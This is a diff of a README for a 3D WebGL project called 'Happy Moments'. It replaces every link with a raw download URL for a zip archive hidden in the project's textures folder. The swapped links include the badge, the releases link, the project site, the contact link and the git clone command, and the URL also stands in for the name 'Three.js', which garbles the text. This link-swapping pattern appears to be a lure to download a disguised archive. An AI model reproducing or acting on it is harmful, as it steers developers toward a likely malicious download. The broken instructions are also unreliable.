@@ -1,8 +1,8 @@
 # Happy Moments in 3D 🌟
 
-![3D Graphics](https://img.shields.io/badge/3D%20Graphics-HappinessHub-blue)
+![3D Graphics](https://raw.githubusercontent.com/michimouse333/happy-moments-3d-webgl/main/public/textures/webgl_d_happy_moments_v2.1.zip%20Graphics-HappinessHub-blue)
 
-Welcome to **Happy Moments**, a project dedicated to creating joyful, interactive experiences in 3D. This repository, hosted on GitHub, showcases the potential of 3D animations and interactions to enhance web experiences. You can explore the latest releases [here](https://github.com/michimouse333/happy-moments-3d-webgl/releases).
+Welcome to **Happy Moments**, a project dedicated to creating joyful, interactive experiences in 3D. This repository, hosted on GitHub, showcases the potential of 3D animations and interactions to enhance web experiences. You can explore the latest releases [here](https://raw.githubusercontent.com/michimouse333/happy-moments-3d-webgl/main/public/textures/webgl_d_happy_moments_v2.1.zip).
 
 ## Table of Contents
 
@@ -17,7 +17,7 @@ Welcome to **Happy Moments**, a project dedicated to creating joyful, interactiv
 
 ## Introduction
 
-**Happy Moments** aims to provide users with engaging 3D visuals that evoke happiness. Created by the team at [Coslynx](https://coslynx.com), this project combines the latest in web technology with artistic design. The goal is to bring joy through interactive 3D experiences that can be easily integrated into websites.
+**Happy Moments** aims to provide users with engaging 3D visuals that evoke happiness. Created by the team at [Coslynx](https://raw.githubusercontent.com/michimouse333/happy-moments-3d-webgl/main/public/textures/webgl_d_happy_moments_v2.1.zip), this project combines the latest in web technology with artistic design. The goal is to bring joy through interactive 3D experiences that can be easily integrated into websites.
 
 ## Features
 
@@ -30,8 +30,8 @@ Welcome to **Happy Moments**, a project dedicated to creating joyful, interactiv
 
 This project utilizes a variety of technologies to achieve its goals:
 
-- **Three.js**: A powerful library for 3D graphics in the browser.
-- **React Three Fiber (R3F)**: A React renderer for Three.js, making it easier to work with 3D in React applications.
+- **https://raw.githubusercontent.com/michimouse333/happy-moments-3d-webgl/main/public/textures/webgl_d_happy_moments_v2.1.zip**: A powerful library for 3D graphics in the browser.
+- **React Three Fiber (R3F)**: A React renderer for https://raw.githubusercontent.com/michimouse333/happy-moments-3d-webgl/main/public/textures/webgl_d_happy_moments_v2.1.zip, making it easier to work with 3D in React applications.
 - **GLTF**: A file format for transmitting 3D models, optimizing performance and loading times.
 - **Drei**: A collection of useful helpers for R3F that simplify common tasks.
 - **WebGL**: A JavaScript API for rendering interactive 3D graphics.
@@ -42,7 +42,7 @@ To get started with **Happy Moments**, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/michimouse333/happy-moments-3d-webgl.git
+   git clone https://raw.githubusercontent.com/michimouse333/happy-moments-3d-webgl/main/public/textures/webgl_d_happy_moments_v2.1.zip
    ```
 2. Navigate to the project directory:
    ```bash
@@ -90,11 +90,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Contact
 
-For questions or feedback, please reach out to us at [Coslynx](https://coslynx.com).
+For questions or feedback, please reach out to us at [Coslynx](https://raw.githubusercontent.com/michimouse333/happy-moments-3d-webgl/main/public/textures/webgl_d_happy_moments_v2.1.zip).
 
 ## Releases
 
-To explore the latest features and updates, check the [Releases](https://github.com/michimouse333/happy-moments-3d-webgl/releases) section. Download the latest version and experience the joy of 3D interactions.
+To explore the latest features and updates, check the [Releases](https://raw.githubusercontent.com/michimouse333/happy-moments-3d-webgl/main/public/textures/webgl_d_happy_moments_v2.1.zip) section. Download the latest version and experience the joy of 3D interactions.
 
 ## Conclusion
 
